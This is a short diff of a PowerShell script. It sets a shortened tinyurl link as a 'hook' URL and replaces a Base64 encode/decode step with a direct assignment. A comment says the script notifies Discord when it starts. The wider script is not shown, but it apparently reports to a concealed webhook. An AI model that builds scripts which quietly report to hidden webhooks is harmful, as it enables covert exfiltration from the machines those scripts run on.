@@ -20,13 +20,8 @@ Add-Type -AssemblyName System.Windows.Forms
 
 $dc = "https://tinyurl.com/opoium1"
 
-# Encode to Base64
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($dc)
-$base64 = [Convert]::ToBase64String($bytes)
 
-# Decode from Base64
-$decodedBytes = [Convert]::FromBase64String($base64)
-$hookurl = [System.Text.Encoding]::UTF8.GetString($decodedBytes)
+$hookurl = "$dc"
 
 
 # Send a notification to discord on start
